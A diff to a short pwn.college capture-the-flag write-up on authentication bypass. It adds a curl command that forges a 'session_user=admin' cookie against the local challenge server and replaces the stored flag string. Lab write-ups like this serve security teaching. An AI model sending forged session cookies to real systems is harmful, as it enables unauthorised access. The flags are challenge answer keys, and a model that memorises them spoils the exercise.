@@ -6,11 +6,11 @@ Authentication bypasses are not always so trivial. Sometimes, the logic of the a
 ## Steps
 
 ```bash
-
+curl -v http://challenge.localhost:80 --cookie 'session_user=admin'
 ```
 
 ## Solution
 
 ```
-pwn.college{cI53l7vCqNxgZ5PFssg58Weoz6a.dlDOzMDL3MTM3QzW}
-```
+ pwn.college{ohWV3rQoEd6BvDkdBnD3IECClhY.dJzN1YDL3MTM3QzW}
+ ```
